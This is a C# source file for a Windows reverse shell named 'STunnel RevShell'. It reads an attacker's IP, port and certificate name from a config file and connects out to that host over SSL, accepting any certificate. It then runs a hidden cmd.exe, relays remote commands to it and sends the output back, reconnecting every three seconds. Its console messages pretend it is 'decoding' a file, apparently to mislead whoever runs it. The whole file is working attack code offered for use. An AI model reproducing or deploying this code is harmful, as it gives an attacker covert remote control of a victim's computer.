//compile the file
//	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe STunnel_RevShell.cs

using System;
using System.Text;
using System.Net.Sockets;
using System.IO;            //for Streams
using System.Diagnostics;   //for Process
using System.Reflection;
using System.Threading;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

namespace ReverseShell2_SSL
{
    class Program
    {

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        static void Main(string[] args)
        {

            Console.WriteLine(@"

                
 _____ _____                      _  ______             _  _          _ _ 
/  ___|_   _|                    | | | ___ \           | || |        | | |
\ `--.  | |_   _ _ __  _ __   ___| | | |_/ /_____   __/ __) |__   ___| | |
 `--. \ | | | | | '_ \| '_ \ / _ \ | |    // _ \ \ / /\__ \ '_ \ / _ \ | |
/\__/ / | | |_| | | | | | | |  __/ | | |\ \  __/\ V / (   / | | |  __/ | |
\____/  \_/\__,_|_| |_|_| |_|\___|_| \_| \_\___| \_/   |_||_| |_|\___|_|_|
                                                                          
ver 1.0 Coded by GuerraIT                               

                
            ");


            
            Console.WriteLine(@"Starting decoding, please wait...");
            Thread.Sleep(3000);

            ReverseShell_SSL rS;
            //check if there is the config file
            string configF = "config";

            if (File.Exists (configF)) {

                string ip, port, cn_name;
                try
                {
                    //read param in config
                    string[] lines = File.ReadAllLines(configF);

                    ip = lines[0].Split(':')[1];
                    port = lines[1].Split(':')[1];
                    cn_name = lines[2].Split(':')[1];


                    //spawn the reverse shell
                    rS = new ReverseShell_SSL(ip, Int32.Parse(port), cn_name);
                }
                catch (Exception) {

                    Console.WriteLine(@"An error occured decoding the file: param reading: check the config file. Procudere aborted");
                    Thread.Sleep(5000);
                }
            }
            //no config file
            else {
                Console.WriteLine(@"An error occured: missing config file. Procudere aborted");
                Thread.Sleep(5000);
            }
         }

        
    }

    class ReverseShell_SSL
    {

        TcpClient tcpClient;
        //NetworkStream networkStream;
        SslStream sslStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        public ReverseShell_SSL(string RHost,Int32 Port, string CN) {

            for (; ; )
            {
                RunServer(RHost,Port,CN);
                Thread.Sleep(3000); //Wait 3 seconds
            }

        }


        private void RunServer(string rhost, Int32 port, string CN)
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect(rhost, port);

                    // Create an SSL stream that will close the client's stream.
                    sslStream = new SslStream(
                        tcpClient.GetStream(),
                        false,
                        new RemoteCertificateValidationCallback(ValidateServerCertificate),
                        null
                        );
                    // The server name must match the name on the server certificate (CN value)
                    sslStream.AuthenticateAsClient(CN);

                    DisplayCertificateInformation(sslStream);

                    //networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(sslStream);
                    streamWriter = new StreamWriter(sslStream);
                }
                catch (Exception) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }

        }

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception) { };
            streamReader.Close();
            streamWriter.Close();
            //networkStream.Close();
            sslStream.Close();
        }

        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }

            }
        }

        // The following method is invoked by the RemoteCertificateValidationDelegate.
        public static bool ValidateServerCertificate(
              object sender,
              X509Certificate certificate,
              X509Chain chain,
              SslPolicyErrors sslPolicyErrors)
        {
            

            // validate all the certificate
            return true;
        }

        static void DisplayCertificateInformation(SslStream stream)
        {
            Console.WriteLine("Certificate revocation list checked: {0}", stream.CheckCertRevocationStatus);

            // Display the properties of the client's certificate.
            X509Certificate remoteCertificate = stream.RemoteCertificate;
            if (stream.RemoteCertificate != null)
            {
                Console.WriteLine("Remote cert was issued to {0} and is valid from {1} until {2}.",
                    remoteCertificate.Subject,
                    remoteCertificate.GetEffectiveDateString(),
                    remoteCertificate.GetExpirationDateString());
            }
            else
            {
                Console.WriteLine("Remote certificate is null.");
            }
        }


    }

}
